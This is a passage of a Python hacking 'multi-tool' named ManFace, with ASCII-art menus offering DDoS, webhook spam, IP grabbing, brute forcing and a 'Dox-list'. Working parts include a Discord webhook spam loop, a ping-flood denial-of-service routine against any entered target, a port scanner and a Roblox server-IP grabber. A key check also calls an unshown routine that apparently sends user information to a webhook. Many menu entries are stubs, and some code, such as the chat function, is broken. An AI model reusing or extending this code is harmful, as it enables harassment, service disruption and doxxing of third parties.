                    .5&@&&@&Y.       .~YGG5?!:.         :~?5GGY!.        J&@&&&&5.
                        ^&@&&&@&!    !P#B5?~:.....      .. ..:^!5B#G7.   !&@&&&@&~
                        .#@&&&&@G^J&@&G7:   :^^.        .^^.   :!G&@&5:P@@&&&&&:
                            #@&&&@G ... 5:B&Y~..   ~? . .:~Y&#.5 ..: G@&&&&&
                            !@&&&&!     777@! .   .~~.   . ~@?~!     ~&&&&@?
                            !&@&&&&Y.   ?:#P. 7^^:..:^^7 .P&:J   .Y&&&&@&?
                            :!^.J@P^^G&5. .!!PY^^7~ :^ ~7~^JP!7. .P&B^~Y@5:^!:
                    ███╗   ███╗ █████╗ ███╗   ██╗        ███████╗ █████╗  ██████╗███████╗
                    ████╗ ████║██╔══██╗████╗  ██║        ██╔════╝██╔══██╗██╔════╝██╔════╝
                    ██╔████╔██║███████║██╔██╗ ██║ █████╗ █████╗  ███████║██║     █████╗  
                    ██║╚██╔╝██║██╔══██║██║╚██╗██║ ╚════╝ ██╔══╝  ██╔══██║██║     ██╔══╝  
                    ██║ ╚═╝ ██║██║  ██║██║ ╚████║        ██║     ██║  ██║╚██████╗███████╗
                    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝        ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝ [{white}PAGE{red}]{Fore.YELLOW} 2{red}
                                :?PY7~^^~~^~!JG:!!@@&#@@7!:GY7~~~~^^~7YP?:
                                ^B&&&&&&#7:?Y:77##J7#&J7.?!^!B&&&&&&#^
                                    Y&#&&&@@~   ^7^ .. ^!^   :&@&&@#&5
                                    PYG&&&@J ^^^.  ..  .^~: ~@&&#B7G
                                    J7:#B@&PG5G~P~?  7~P~B5GP&@#B~~Y
                                    BY 7J&&5YGB55@!Y5!&P5BP55&@Y? 7#
                                    5&:~JGGBP!J.^P JY Y^.J^YBGGY~.BG
                                    ~PB~.^Y&&B5GYJ5P?P?5G&&Y7.^BG!
                                        .57 J?BPG&5?Y5?#5BPB?Y.!P:
                                        JG:^J!!7??Y5J7?!~Y^.P5
                                            .#G!:. . PB ^ .:7P#.
                                            75BG5^ ~7 ^YP#P7
                                                ..~7~^7~..
                                                    .. 
        {white}
        ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
        ┃ [{red}DISCORD{white}]discord.gg/jGYTrstr                                                    ┃
        ┃ [{cyan}DISCORD{white}] swedish.man                                                           ┃
        ┃ [{red}VERSION{white}] 1.0.0                                                                 ┃
        ┃ [{cyan}USER{white}] {hostname}                                                          ┃
        ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
        ┃ [{red}Exit{white}] {green}>{white} Exit                                                                   ┃
        ┃                                                                                 ┃
        ┃ [{cyan}40{white}] {green}>{white}              [{cyan}50{white}] {green}>{white}              [{cyan}60{white}] {green}>{white}              [{cyan}70{white}] {green}>{white}              ┃
        ┃ [{cyan}41{white}] {green}>{white} Dox-list     [{cyan}51{white}] {green}>{white}              [{cyan}61{white}] {green}>{white}              [{cyan}71{white}] {green}>{white}              ┃
        ┃ [{cyan}42{white}] {green}>{white}              [{cyan}52{white}] {green}>{white}              [{cyan}62{white}] {green}>{white}              [{cyan}72{white}] {green}>{white}              ┃
        ┃ [{cyan}43{white}] {green}>{white}              [{cyan}53{white}] {green}>{white}              [{cyan}63{white}] {green}>{white}              [{cyan}73{white}] {green}>{white}              ┃
        ┃ [{cyan}44{white}] {green}>{white}              [{cyan}54{white}] {green}>{white}              [{cyan}64{white}] {green}>{white}              [{cyan}74{white}] {green}>{white}              ┃
        ┃ [{cyan}45{white}] {green}>{white}              [{cyan}55{white}] {green}>{white}              [{cyan}65{white}] {green}>{white}              [{cyan}75{white}] {green}>{white}              ┃
        ┃ [{cyan}46{white}] {green}>{white}              [{cyan}56{white}] {green}>{white}              [{cyan}66{white}] {green}>{white}              [{cyan}76{white}] {green}>{white}              ┃
        ┃ [{cyan}47{white}] {green}>{white}              [{cyan}57{white}] {green}>{white}              [{cyan}67{white}] {green}>{white}              [{cyan}77{white}] {green}>{white}              ┃
        ┃ [{cyan}48{white}] {green}>{white}              [{cyan}58{white}] {green}>{white}              [{cyan}68{white}] {green}>{white}              [{cyan}78{white}] {green}>{white} Prev-page(1) ┃
        ┃ [{cyan}49{white}] {green}>{white}              [{cyan}59{white}] {green}>{white}              [{cyan}69{white}] {green}>{white}              [{cyan}79{white}] {green}>{white} Next-page(3) ┃
        ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
        """ #use this website "https://patorjk.com/software/taag/#p=display&f=Big&t=Type%20Something%20" and paste it at the first 3
        print(welcome2, text2)
    
        command2 = input(f"""\n    ┏━━({hostname}-admin[{green}1{white}]Home)━[$]
    ┗━$> """)
        if command2 == "Exit":
            exit_command()
        elif command2 == "exit":
            exit_command()

        elif command2 == "40":
            os.system("cls")
            exit_command()

        elif command2 == "41":
            time.sleep(0.5)
            os.system("cls")
            Dox_list()
        elif command2 == "42":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "43":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "44":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "45":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "46":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "47":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "48":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "49":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "50":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "51":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "52":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "53":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "54":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "55":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "55":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "56":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "57":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "58":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "59":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "60":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "61":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "62":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "63":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "64":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "65":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "66":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "67":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "68":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "69":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "70":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "71":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "72":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "73":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "74":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "75":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "76":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "77":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "78":
            os.system("cls")
            onstart()
        elif command2 == "79":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        else:
            print(f"    {red}THAT COMMAND DOES NOT EXIST{white}")
            time.sleep(1)
            os.system("cls")
            menuPage2()


    def menuPage1():
        global onstart

        if not is_admin():
            os.system(f"cls && title Home - MANFACE v1.0.0 [WARNING] You are running ManFace without admin privileges, some options might fail and crash")
        elif is_admin():
            os.system(f"cls && title Home - MANFACE v1.0.0 [RUNNING AS ADMIN]")

        hostname = socket.gethostname()
        """print("Hostname:", hostname)"""
        Admin = "DESKTOP-OFALC7N"

        for u in users:
            if hostname == Admin:
                print("")

        welcome1 = """
    Welcome To"""

        text1 = f"""
        {red}                                                                   
                    ...                                                            ...
                !G&&&&&B5~                                                    ~YB&&&&#P!
                ..:!G&@@@@&Y.             .:~!77!~~~~~~!77!~:.             .J&@@@@&P!:..
                    .5&@&&@&Y.       .~YGG5?!:.         :~?5GGY!.        J&@&&&&5.
                        ^&@&&&@&!    !P#B5?~:.....      .. ..:^!5B#G7.   !&@&&&@&~
                        .#@&&&&@G^J&@&G7:   :^^.        .^^.   :!G&@&5:P@@&&&&&:
                            #@&&&@G ... 5:B&Y~..   ~? . .:~Y&#.5 ..: G@&&&&&
                            !@&&&&!     777@! .   .~~.   . ~@?~!     ~&&&&@?
                            !&@&&&&Y.   ?:#P. 7^^:..:^^7 .P&:J   .Y&&&&@&?
                            :!^.J@P^^G&5. .!!PY^^7~ :^ ~7~^JP!7. .P&B^~Y@5:^!:
                    ███╗   ███╗ █████╗ ███╗   ██╗        ███████╗ █████╗  ██████╗███████╗
                    ████╗ ████║██╔══██╗████╗  ██║        ██╔════╝██╔══██╗██╔════╝██╔════╝
                    ██╔████╔██║███████║██╔██╗ ██║ █████╗ █████╗  ███████║██║     █████╗  
                    ██║╚██╔╝██║██╔══██║██║╚██╗██║ ╚════╝ ██╔══╝  ██╔══██║██║     ██╔══╝  
                    ██║ ╚═╝ ██║██║  ██║██║ ╚████║        ██║     ██║  ██║╚██████╗███████╗
                    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝        ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝ [{white}PAGE{red}]{Fore.YELLOW} 1{red}
                                :?PY7~^^~~^~!JG:!!@@&#@@7!:GY7~~~~^^~7YP?:
                                ^B&&&&&&#7:?Y:77##J7#&J7.?!^!B&&&&&&#^
                                    Y&#&&&@@~   ^7^ .. ^!^   :&@&&@#&5
                                    PYG&&&@J ^^^.  ..  .^~: ~@&&#B7G
                                    J7:#B@&PG5G~P~?  7~P~B5GP&@#B~~Y
                                    BY 7J&&5YGB55@!Y5!&P5BP55&@Y? 7#
                                    5&:~JGGBP!J.^P JY Y^.J^YBGGY~.BG
                                    ~PB~.^Y&&B5GYJ5P?P?5G&&Y7.^BG!
                                        .57 J?BPG&5?Y5?#5BPB?Y.!P:
                                        JG:^J!!7??Y5J7?!~Y^.P5
                                            .#G!:. . PB ^ .:7P#.
                                            75BG5^ ~7 ^YP#P7
                                                ..~7~^7~..
                                                    .. 
        {white} 
        ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
        ┃ [{red}DISCORD{white}]discord.gg/jGYTrstr                                                    ┃
        ┃ [{cyan}DISCORD{white}] swedish.man                                                           ┃
        ┃ [{red}VERSION{white}] 1.0.0                                                                 ┃
        ┃ [{cyan}USER{white}] {hostname}                                                          ┃
        ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
        ┃ [{red}Exit{white}] {green}>{white} Exit                                                                   ┃
        ┃                                                                                 ┃
        ┃ [{cyan}0{white}] {green}>{white} Layer-4      [{cyan}10{white}] {green}>{white} IP-Grabber   [{cyan}20{white}] {green}>{white} Wifi-Brute   [{cyan}30{white}] {green}>{white}               ┃ 
        ┃ [{cyan}1{white}] {green}>{white} Layer-7      [{cyan}11{white}] {green}>{white} Port-Check   [{cyan}21{white}] {green}>{white} Zip-Brute    [{cyan}31{white}] {green}>{white}               ┃
        ┃ [{cyan}2{white}] {green}>{white} Webhook-Spam [{cyan}12{white}] {green}>{white}              [{cyan}22{white}] {green}>{white}              [{cyan}32{white}] {green}>{white}               ┃
        ┃ [{cyan}3{white}] {green}>{white} Phone-lookup [{cyan}13{white}] {green}>{white}              [{cyan}23{white}] {green}>{white}              [{cyan}33{white}] {green}>{white}               ┃
        ┃ [{cyan}4{white}] {green}>{white}              [{cyan}14{white}] {green}>{white}              [{cyan}24{white}] {green}>{white}              [{cyan}34{white}] {green}>{white}               ┃
        ┃ [{cyan}5{white}] {green}>{white}              [{cyan}15{white}] {green}>{white} R-IP-Grabber [{cyan}25{white}] {green}>{white}              [{cyan}35{white}] {green}>{white}               ┃
        ┃ [{cyan}6{white}] {green}>{white} Chat         [{cyan}16{white}] {green}>{white}              [{cyan}26{white}] {green}>{white}              [{cyan}36{white}] {green}>{white}               ┃
        ┃ [{cyan}7{white}] {green}>{white}              [{cyan}17{white}] {green}>{white}              [{cyan}27{white}] {green}>{white}              [{cyan}37{white}] {green}>{white}               ┃
        ┃ [{cyan}8{white}] {green}>{white}              [{cyan}18{white}] {green}>{white}              [{cyan}28{white}] {green}>{white}              [{cyan}38{white}] {green}>{white} Admin         ┃
        ┃ [{cyan}9{white}] {green}>{white}              [{cyan}19{white}] {green}>{white} DDoS         [{cyan}29{white}] {green}>{white}              [{cyan}39{white}] {green}>{white} Next-page(3)  ┃
        ┣━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━┫
        ┃ [{cyan}C{white}] {green}>{white} Credits   ┃                                            ┃ [{cyan}S{white}] {green}>{white} Settings   ┃
        ┗━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━┛
    """ #use this website "https://patorjk.com/software/taag/#p=display&f=Big&t=Type%20Something%20" and paste it at the first 3
        print(welcome1, text1)

        command = input(f"""\n    ┏━━({hostname}-admin[{green}1{white}]Home)━[$]
    ┗━$> """)

        if command == "Exit":
            time.sleep(0.5)
            exit_command()
        if command == "exit":
            time.sleep(0.5)
            exit_command()

        if command == "0":
            os.system("cls")
            Layer4()
            
        elif command == "C":
            os.system("cls")
            print(f"[{cyan}Developers{white}] swedish.man(Swedish Man)\n[{cyan}ManFace.py Founder{white}] swedish.man(Swedish Man)\n[{cyan}Name(ManFace) founder{white}] Nick\n[{cyan}Ideas{white}] Nick, swedish.man(Swedish Man)\n")
            command = input("Press enter to go back... ")
            if command == "":
                onstart()
            else:
                onstart()

        elif command == "c":
            os.system("cls")
            print(f"[{cyan}Developers{white}] swedish.man(Swedish Man)\n[{cyan}ManFace.py Founder{white}] swedish.man(Swedish Man)\n[{cyan}Name(ManFace) founder{white}] Nick\n[{cyan}Ideas{white}] Nick, swedish.man(Swedish Man)\n")
            command = input("Press enter to go back... ")
            if command == "":
                onstart()
            else:
                onstart()

        elif command == "1":
            os.system("cls")
            Layer7()

        elif command == "2":
            webhook = input("   Enter valid discord webhook: ")
            print("    Checking...")
            def check_webhook(webhook):
                try:
                    response = requests.get(webhook)
                    if response.status_code == 200:
                        print(f"    Webhook is {green}valid{white} and working.")
                    else:
                        print(f"    Webhook responded with status code {response.status_code}.")
                except requests.RequestException as e:
                    print(f"    An {red}error{white} occurred: {str(e)}")

            check_webhook(webhook)
            time.sleep(1)
            msg = input("    Please Insert webhook Spam Message: ")
            def spam(msg, webhook):
                for i in range(30):
                    try:   
                        data = requests.post(webhook, json={'content': msg})
                        if data.status_code == 200:
                            print(f"    Ctrl + C to stop. Sent MSG: {green}{msg}{white}")
                    except:
                        print("    Stoping...")
                        time.sleep(5)
                        onstart()
            counts = 1
            while counts == 1:
                spam(msg, webhook)

        elif command == "3":
            time.sleep(0.5)
            os.system("cls")
            phoneLookUp()

        elif command == "4":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()

        elif command == "5":
            os.system("cls")
            def run_BruteZip_file(BruteZipfile_path):
                try:
                    subprocess.run(["python", BruteZipfile_path], check=True)
                except FileNotFoundError:
                    print("Brute-face file was not found. Wanna install it?")
                    BruteFace_Install = input("Y/N: ")
                    if BruteFace_Install == "Y":
                        print(f"{green}Installing...{white}")
                        time.sleep(2.5)
                        exit_command()
                    elif BruteFace_Install == "y":
                        print(f"{green}Installing...{white}")
                        time.sleep(2.5)
                        exit_command()
                    elif BruteFace_Install == "N":
                        time.sleep(0.5)
                        onstart()
                    elif BruteFace_Install == "n":
                        time.sleep(0.5)
                        onstart()
                    else:
                        print(f"{red}  THAT COMMAND DOES NOT EXIST{white}")
            time.sleep(0.5)
            BruteZipfile_path = "Zip-bruteforce/Zip-bruteforce.py"
            run_BruteZip_file(BruteZipfile_path)
        elif command == "6":
            os.system("cls")
            chat()
        elif command == "7":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "8":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "9":
            time.sleep(0.5)
            IP_grabber()
        elif command == "10":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "11":
            def check_ports(ip, ports):
                for port in ports:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((ip, port))
                    if result == 0:
                        print(f"    Port {port} is {green}open{white}")
                    else:
                        print(f"    Port {port} is {red}closed{white}")
                    sock.close()
            def check_portsStart():
                if not is_admin():
                    os.system(f"cls && title Port-Checker - MANFACE v1.0.0 [WARNING] You are running ManFace without admin privileges, some options might fail and crash")
                elif is_admin():
                    os.system(f"cls && title Port-Checker - MANFACE v1.0.0 [RUNNING AS ADMIN]")
                check_ports(IPcommand, ports)
            IPcommand = input("    IP Adress: ")
            ports = [21, 22, 53, 80, 443, 8080]
            check_portsStart()
            time.sleep(2.5)
            onstart()

        elif command == "12":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "13":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "14":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "15":
            time.sleep(0.5)
            LOG_FILE = open(
                file     = max(glob(f"{expanduser('~')}\AppData\Local\Roblox\logs\*"), key = getctime),
                encoding = 'utf-8'
            ).readlines()

            def server_grabber():
                log_data = ''.join([line for line in LOG_FILE if 'Connection accepted from' in line]).replace('|', ':')
                server_ips = findall(r'\d+(?:\.\d+){3}:\d+', log_data)
                server_ips[-1] = f'Current server: {server_ips[-1]}'
                return ' -> '.join(server_ips)
            
            print(server_grabber())
            time.sleep(5)
            onstart()

        elif command == "16":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "17":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "18":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "19":
            time.sleep(0.5)
            os.system("cls")
            def run_ddos_file(file_path):
                try:
                    subprocess.Popen(["start", "cmd", "/k", "python", file_path], shell=True)
                except Exception as e:
                    print("    File not found. Do you have it installed?")
                    DDoSInstalled_ = input("    Y/N: ")
                    if DDoSInstalled_ == "Y":
                        print("    Check if the file is in the right dir.")
                        time.sleep(2)
                        onstart()
                    if DDoSInstalled_ == "y":
                        print("    Check if the file is in the right dir.")
                        time.sleep(2)
                        onstart()
                    if DDoSInstalled_ == "N":
                        print("    Do you wan't to install it?")
                        DDoS_Installed_ = input("   Y/N: ")
                        if DDoS_Installed_ == "Y":
                            print(f"{green}    Installing...")
                    if DDoSInstalled_ == "n":
                        print("    Do you wan't to install it?")
                        if DDoS_Installed_ == "y":
                            print(f"{green}    Installing...")
            if __name__ == "__main__":
                file_path = "DDoS/ManFace_DDoS.py"
                run_ddos_file(file_path)
            onstart()
        elif command == "20":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "21":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "22":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "23":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "24":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "25":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "26":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "27":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "28":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "29":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "30":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "31":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "32":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "33":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "34":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "35":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "36":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "37":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "38":
            os.system("cls")
            time.sleep(0.5)
            onstart()
        elif command == "39":
            os.system("cls")
            menuPage2()
        else:
            print(f"    {red}THAT COMMAND DOES NOT EXIST{white}")
            time.sleep(2.5)
            onstart()

    def onstart():
        if not is_admin():
            os.system(f"cls && title Home - MANFACE v1.0.0 [WARNING] You are running ManFace without admin privileges, some options might fail and crash")
        elif is_admin():
            os.system(f"cls && title Home - MANFACE v1.0.0 [RUNNING AS ADMIN]")
        menuPage1()

    def DDoS():
        print("\n    Run as admin for it to work. There's no botnets so for now it's a DoS")
        time.sleep(1)
        Target = input("\n    Enter target: ")
        time.sleep(0.5)

        for x in range(100):
            os.system(f"ping -t {Target}")
        print(x)
        onstart()

    def DDoSstart():
        if not is_admin():
            os.system(f"cls && title DDoS - MANFACE v1.0.0 [WARNING] You are running ManFace without admin privileges, some options might fail and crash")
        elif is_admin():
            os.system(f"cls && title DDoS - MANFACE v1.0.0 [RUNNING AS ADMIN]")
        DDoS()

    def chat():
        def get_ipv4_address():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ipv4_address = s.getsockname()[0]
                s.close()
                return ipv4_address
            except Exception as e:
                print("Error occurred while fetching IPv4 address:", e)
                return None

        ipv4_address = get_ipv4_address()
        print("    Chat works but ending the session does not work yet. To end the session you have to restart")
        time.sleep(0.5)
        choice = input("\n    HOST (1) OR CONNECT (2): ")
        
        if choice == "1":
            print(f"{Fore.YELLOW}    HOSTING...{white}")
            Chat_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            Chat_server.bind((ipv4_address, 9999))
            Chat_server.send(ipv4_address, Chat_client)
            Chat_server.listen()
            print(f"{green}    HOSTING ON: {ipv4_address}:9999{white}")
            

            Chat_client, _ = Chat_server.accept()
        elif choice == "2":
            print(f"{green}    CONNECTING...{white}")
            time.sleep(0.5)
            Chat_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            Chat_client.connect((ipv4_address, 9999))
            print(f"{green}    CONNECTED TO: {Chat_server}{white}")
        else:
            print(f"{red}    FAILED TO CONNECT TO CHAT SERVER{white}")
            time.sleep(3)
            onstart()

        def sending_message(c):
            while True:
                message = input("")
                c.send(message.encode())
                print(f"{green}YOU:> {white}" + message)

        def receiving_messages(c):
            while True:
                print(f"{green}\nPARTNER:> {white}" + c.recv(1024).decode())

        threading.Thread(target=sending_message, args=(Chat_client,)).start()
        threading.Thread(target=receiving_messages, args=(Chat_client,)).start()

    def chatstart():
        if not is_admin():
            os.system(f"cls && title Chat - MANFACE v1.0.0 [WARNING] You are running ManFace without admin privileges, some options might fail and crash")
        elif is_admin():
            os.system(f"cls && title Chat - MANFACE v1.0.0 [RUNNING AS ADMIN]")
        chat()

    #============================================================KEY SYSTEM============================================================#

    def Key(users):
            os.system("cls")

            KeyTextCheckbox = f"""
    {red}    ██╗  ██╗███████╗██╗   ██╗
        ██║ ██╔╝██╔════╝╚██╗ ██╔╝
        █████╔╝ █████╗   ╚████╔╝ 
        ██╔═██╗ ██╔══╝    ╚██╔╝  
        ██║  ██╗███████╗   ██║   
        ╚═╝  ╚═╝╚══════╝   ╚═╝   
        
        {white}[{cyan}NOTICE{white}]Theres no database here, therefore your key is: {Password}
        {white}"""
            print(KeyTextCheckbox)
            while True:
                username = input(f"""
        [Key] """)

                for u in users:
                    if username == u[0]:
                        print(f"        [{cyan}Checking key{white}]")
                        time.sleep(1)
                        print(f"        [{green}SUCCESS{white}]")
                        time.sleep(0.5)
                        UserInfoWebhookSender()
                        time.sleep(0.5)
                        menuPage1()
                        return username
                print(f"    [{red}Key{white}]Key is incorrect. Try again.")
                time.sleep(1)
                os.system("cls")
                print(KeyTextCheckbox)
                time.sleep(0.1)

    uppercase_letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    lowercase_letters = uppercase_letters.lower()

    upper, lower = True, True

    all = ""

    length = 20
    amount = 10


    if upper:
        all += uppercase_letters

    if lower:
        all += lowercase_letters

    for x in range(amount):
        Password = "".join(random.sample(all, length))
        print(Password)

    users = [[Password]]

    def is_admin():
        try:
            with open(os.path.join(os.environ["SystemRoot"], "test.txt"), "w") as test_file:
                test_file.write("This is a test")
            os.remove(os.path.join(os.environ["SystemRoot"], "test.txt"))
            return True
        except:
            return False

    def keystart():
        if not is_admin():
            os.system(f"cls && title Login - MANFACE v1.0.0 [WARNING] You are running ManFace without admin privileges, some options might fail and crash")
        elif is_admin():
            os.system(f"cls && title Login - MANFACE v1.0.0 [RUNNING AS ADMIN]")

    def check_internet_connection():
        try:
            host = "www.google.com"
            port = 80
            timeout = 1

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)

            sock.connect((host, port))

            print(f"[{green}SERVER NOTICE{white}]SUCCESSFULLY CONNECTED TO SERVER")
            serverConnected = True

            sock.close()
            time.sleep(1)
            keystart()
            Key(users)
        except Exception as e:
            print(f"[{cyan}NOTICE{white}]FAILED TO CONNECT TO SERVER")
            print(f"[{cyan}NOTICE{white}]REASSON: {e}")
            serverConnected = False
            time.sleep(1)
            print(f"[{yellow}RETRYING{white}]")
            check_internet_connection()

    current_version = "1.0.0"

    gist_raw_url = "https://gist.githubusercontent.com/NilsNisse/34bf3e3ebda7ed86a257e477c6394525/raw/a35f7a3960fd9e0c557942e146fb17d6bd27fa15/ManFaceUpdater.txt"

    def FirstStart():
        print(f"[{cyan}NOTICE{white}]Checking if admin...")
        if not is_admin():
            print(f"[{red}WARNING{white}]You are running ManFace without admin, some options might fail and crash.")
            time.sleep(5)
            if __name__ == "__main__":
                check_internet_connection()
        if is_admin():
            print(f"[{green}INFO{white}]Running as admin")
            time.sleep(0.5)
            if __name__ == "__main__":
                check_internet_connection()

    def startFirstStart():
        if not is_admin():
            os.system(f"cls && title Connecting - MANFACE v1.0.0 [WARNING] You are running ManFace without admin privileges, some options might fail and crash")
        if is_admin():
            os.system(f"cls && title Connecting - MANFACE v1.0.0 [RUNNING AS ADMIN]")
        FirstStart()
    startFirstStart()

    #============================================================Anti-reverse-engineer System============================================================#
    """
    def Anti_reverse_detect():
        os.system("cls")
        print(f"\n{red}|{white} {red}[{white} Black listed program(s) detected {red}]{white}")
        time.sleep(2.5)
        os.system("cls")
        sys.exit()

    def Anti_reverse_undetect():
        os.system("cls")
        print(f"\n{green}|{white} {green}[{white} No black listed program(s) detected {green}]{white}")
        time.sleep(2.5)
        os.system("cls")
        FirstStart()

    def Anti_Reverse_start():
        def encrypt(text):
            encrypted_text = ""
            for char in text:
                encrypted_text += chr(ord(char) + 1)  #Shift each character by 1 (you can use a more complex algorithm)
            return encrypted_text

        def decrypt(text):
            decrypted_text = ""
            for char in text:
